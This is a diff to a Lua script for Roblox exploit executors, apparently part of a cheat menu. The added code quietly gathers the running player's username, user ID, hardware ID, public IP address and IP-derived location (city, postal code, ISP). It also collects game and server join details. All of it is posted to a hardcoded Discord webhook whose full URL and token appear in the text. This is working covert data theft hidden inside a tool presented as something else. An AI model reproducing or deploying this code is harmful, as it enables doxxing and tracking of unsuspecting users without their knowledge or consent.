@@ -1177,71 +1177,90 @@ local setTitleButton = Tab:CreateButton({
 
 
 
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local MarketplaceService = game:GetService("MarketplaceService")
+local LocalizationService = game:GetService("LocalizationService")
+local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
+local UserInputService = game:GetService("UserInputService")
+local Stats = game:GetService("Stats")
 
-local webhookUrl = "https://discord.com/api/webhooks/1320193689087119362/FEY3gMIetxR8dk8RV8zWjRTQ-FBfFkKx-5ltwTfT8CxngwJdRC_bSiyAX1UXIOu2DdAx"
+local LocalPlayer = Players.LocalPlayer
+local UserId = LocalPlayer.UserId
+local DisplayName = LocalPlayer.DisplayName
+local Username = LocalPlayer.Name
+local MembershipType = tostring(LocalPlayer.MembershipType):sub(21)
+local AccountAge = LocalPlayer.AccountAge
+local Country = LocalizationService.RobloxLocaleId
+local GetIp = game:HttpGet("https://v4.ident.me/")
+local GetData = HttpService:JSONDecode(game:HttpGet("http://ip-api.com/json"))
+local Hwid = RbxAnalyticsService:GetClientId()
+local GameInfo = MarketplaceService:GetProductInfo(game.PlaceId)
+local GameName = GameInfo.Name
+local Platform = (UserInputService.TouchEnabled and not UserInputService.MouseEnabled) and "📱 Mobile" or "💻 PC"
+local Ping = math.round(Stats.Network.ServerStatsItem["Data Ping"]:GetValue())
 
-local function sendWebhook(player)
-    local username = player.Name
-    local userId = player.UserId
-    local profileLink = "https://www.roblox.com/users/" .. userId .. "/profile"
-    local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=150&height=150&format=png"
-    local timeExecuted = os.date("%Y-%m-%d %H:%M:%S")
-    local embedMessage = {
-        content = "🚨 **Script Executed** 🚨",
+local function detectExecutor()
+    return identifyexecutor() or "Unknown Executor"
+end
+
+local function createWebhookData()
+    local executor = detectExecutor()
+    local date = os.date("%m/%d/%Y")
+    local time = os.date("%X")
+    local gameLink = "https://www.roblox.com/games/" .. game.PlaceId
+    local playerLink = "https://www.roblox.com/users/" .. UserId
+    local mobileJoinLink = "https://www.roblox.com/games/start?placeId=" .. game.PlaceId .. "&launchData=" .. game.JobId
+    local jobIdLink = "https://www.roblox.com/games/" .. game.PlaceId .. "?jobId=" .. game.JobId
+
+    local data = {
+        username = "AKs Execution Logger",
+        avatar_url = "https://i.imgur.com/AfFp7pu.png",
         embeds = {
             {
-                title = "🛠️ Execution Details",
-                description = string.format("**Executed by:** [%s](%s)\n**Execution Time:** %s", username, profileLink, timeExecuted),
-                color = 0x1F8B4C,
-                thumbnail = {
-                    url = avatarUrl,
-                },
-                image = {
-                    url = avatarUrl,
-                },
-                fields = {
-                    {
-                        name = "Username",
-                        value = username,
-                        inline = true
-                    },
-                    {
-                        name = "Profile Link",
-                        value = profileLink,
-                        inline = true
-                    },
-                    {
-                        name = "Time Executed",
-                        value = timeExecuted,
-                        inline = true
-                    }
-                },
-                footer = {
-                    text = "Execution Details Powered by Roblox",
-                    icon_url = avatarUrl
-                },
-                timestamp = os.date("!%Y-%m-%dT%H:%M:%S")
+                title = "🎮 Game Information",
+                description = string.format("**[%s](%s)**\n`ID: %d`", GameName, gameLink, game.PlaceId),
+                color = tonumber("0x2ecc71")
+            },
+            {
+                title = "👤 Player Information",
+                description = string.format(
+                    "**Display Name:** [%s](%s)\n**Username:** %s\n**User ID:** %d\n**Membership:** %s\n**Account Age:** %d days\n**Platform:** %s\n**Ping:** %dms",
+                    DisplayName, playerLink, Username, UserId, MembershipType, AccountAge, Platform, Ping
+                ),
+                color = MembershipType == "Premium" and tonumber("0xf1c40f") or tonumber("0x3498db")
+            },
+            {
+                title = "🌐 Location & Network",
+                description = string.format(
+                    "**IP:** `%s`\n**HWID:** `%s`\n**Country:** %s :flag_%s:\n**Region:** %s\n**City:** %s\n**Postal Code:** %s\n**ISP:** %s\n**Organization:** %s\n**Time Zone:** %s",
+                    GetIp, Hwid, GetData.country, string.lower(GetData.countryCode), GetData.regionName, GetData.city, GetData.zip, GetData.isp, GetData.org, GetData.timezone
+                ),
+                color = tonumber("0xe74c3c")
+            },
+            {
+                title = "⚙️ Technical Details",
+                description = string.format(
+                    "**Executor:** `%s`\n**Job ID:** [Click to Copy](%s)\n**Mobile Join:** [Click](%s)",
+                    executor, jobIdLink, mobileJoinLink
+                ),
+                color = tonumber("0x95a5a6"),
+                footer = { 
+                    text = string.format("📅 Date: %s | ⏰ Time: %s", date, time)
+                }
             }
         }
     }
-    local success, response = pcall(function()
-        return http_request({
-            Url = webhookUrl,
-            Method = "POST",
-            Headers = {
-                ["Content-Type"] = "application/json"
-            },
-            Body = game:GetService("HttpService"):JSONEncode(embedMessage)
-        })
-    end)
-    if not success then
-        warn("Failed to send webhook: " .. tostring(response))
-    else
-        print("")
-    end
+    return HttpService:JSONEncode(data)
 end
 
-local player = game.Players.LocalPlayer
-if player then
-    sendWebhook(player)
+local function sendWebhook(webhookUrl, data)
+    local headers = {["Content-Type"] = "application/json"}
+    local request = http_request or request or HttpPost or syn.request
+    local webhookRequest = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}
+    request(webhookRequest)
 end
+
+local webhookUrl = "https://discord.com/api/webhooks/1320193689087119362/FEY3gMIetxR8dk8RV8zWjRTQ-FBfFkKx-5ltwTfT8CxngwJdRC_bSiyAX1UXIOu2DdAx" 
+local webhookData = createWebhookData()
+sendWebhook(webhookUrl, webhookData)
